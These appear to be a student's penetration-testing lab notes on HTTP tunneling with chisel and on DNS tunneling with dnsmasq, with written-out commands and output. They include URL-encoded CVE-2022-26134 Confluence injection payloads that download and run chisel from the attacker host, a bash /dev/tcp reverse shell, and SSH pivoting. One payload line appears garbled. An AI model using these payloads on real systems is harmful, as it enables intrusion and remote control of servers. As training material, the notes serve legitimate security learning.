
# HTTP Tunneling


2. Start VM Group 2. Download **/exercises/chisel_exercise_client** from CONFLUENCE01 (**192.168.239.63**). There's a server running on port 8008 on PGDATABASE01 (**10.4.239.215**).
   Set up a port forward using Chisel that allows you to run **chisel_exercise_client** against port 8008 on PGDATABASE01.

- Get file
```bash
wget http://192.168.239.63:8090/exercises/chisel_exercise_client
	--2024-06-25 19:04:17--  http://192.168.239.63:8090/exercises/chisel_exercise_client
	Connecting to 192.168.239.63:8090... connected.
	HTTP request sent, awaiting response... 200 
	Length: 1026416 (1002K)
	Saving to: ‘chisel_exercise_client’
	
	chisel_exercise_client  100%[=============================================================================================>] 1002K 1.42MB/s in 0.7s 
	
	2024-06-25 19:04:18 (1.42 MB/s) - ‘chisel_exercise_client’ saved [1026416/1026416]


chmod +x chisel_exercise_client
```

- Download compatible version of chisel, make executable, serve up
```bash
# Download v1.8.1 (working in ~/exercises/forward_tunnel dir)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
	...
	chisel_1.8.1_linux_amd64.gz  100%[============================================================================>]   3.33M  --.-KB/s    in 0.1s
	...

# Unzip v1.8.1
gunzip chisel_1.8.1_linux_amd64.gz

# Rename
mv chisel_1.8.1_linux_amd64 chisel

# Make executable
chmod +x chisel

# Server
python3 -m http.server 80
```

- Set up Reverse Port Forward Server on Kali
```bash
chisel server --port 8080 --reverse
	2024/06/24 21:16:49 server: Reverse tunnelling enabled
	2024/06/24 21:16:49 server: Fingerprint eqnhO59Dz8gJ4de6b2Kvvnbv1X/QhAPgs8v4PsyBhck=
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
```

- Send payload to CONFLUENCE01 to:
	1. Download chisel, Store it in /tmp/, & Make Executable
	2. Initiate a reverse port forward
```bash
# 1.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

# 2.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.g%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3Ert%28%29%22%29%7D/
```

- Verify via our chisel server
```bash
	2024/06/25 19:08:25 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
	2024/06/25 19:08:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
	- NOTE the tun is set to 127.0.0.1:1080

- Set proxychains config file
```bash
sudo vim /etc/proxychains4.conf

	socks5  127.0.0.1 1080
```
	- NOTE we set the same port as the Reverse Proxy seen above


- Run `chisel_exercise_client` via proxychains against PGDATABASE01
```bash
proxychains4 ./chisel_exercise_client -i 10.4.239.215 -p 8008
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	Connecting to 10.4.239.215:8008
	[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.239.215:8008  ...  OK
	Flag: "OS{bec052233ff6ca0ebd989fcde4d587ec}"
```



# DNS Tunneling

2. Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the binary from **/exercises/dnscat_exercise_client** on CONFLUENCE01. Set up a port forward with dnscat2 which allows you to run **dnscat_exercise_client** against the server running on port 4646 on HRSHARES.












**EDIT**











- Enable the SSH server on Kali & verify SSH port is open
```bash
sudo systemctl start ssh

udo ss -ntplu
	Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process  
	...
	tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=2153,fd=3))
	tcp         LISTEN       0            128                         [::]:22                          [::]:*           users:(("sshd",pid=2153,fd=4))
```
	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6


- Compromise CONFLUENCE01 w/ CVE-2022-26134 & construct remote port forward.
```bash
curl -v http://192.168.189.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5555%200%3E%261%27%29.start%28%29%22%29%7D/

# In revshell
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Set up a dynamic reverse port forward
ssh -N -R 2345 192.168.45.166
```

- In Kali, ssh into PGDATABASE01 and FELINEAUTHORITY
```bash
# Tab 1 (PGDATABASE01)
proxychains ssh database_admin@10.4.189.215
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  127.0.0.1:2345  ...  10.4.189.215:22  ...  OK
	The authenticity of host '10.4.189.215 (10.4.189.215)' can''t be established.
	ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
	...
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.4.189.215' (ED25519) to the list of known hosts.
	database_admin@10.4.189.215''s password:
	...
	database_admin@pgdatabase01:~$


# Tab 2 (FELINEAUTHORITY)
ssh kali@192.168.189.7
	kali@192.168.189.7''s password: 
	Linux felineauthority 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64
	...
	kali@felineauthority:~$
```

- Change config file and simulate a DNS setup on FELINEAUTHORITY
```bash
cd dns_tunneling

cat dnsmasq.conf
	# Do not read /etc/resolv.conf or /etc/hosts
	no-resolv
	no-hosts
	
	# Define the zone
	auth-zone=feline.corp
	auth-server=feline.corp
```
	- Configuration ignores */etc/resolv.conf* and */etc/hosts*
	- Only defines the *auth-zone* and *auth-server* variables
		- Tells dnsmasq to act as the authoritative name server for **feline.corp** zone
	- Records have not b een configured.

- Start **dnsmasq** using 'no daemon' mode for foreground processing
```bash
sudo dnsmasq -C dnsmasq.conf -d
	[sudo] password for kali: 
	dnsmasq: started, version 2.89 cachesize 150
	dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
	dnsmasq: warning: no upstream servers configured
	dnsmasq: cleared cache
```

- In a new FELINEAUTHORITY shell, capture DNS packets (UDP/53)
```bash
sudo tcpdump -i ens192 udp port 53
	[sudo] password for kali: 
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```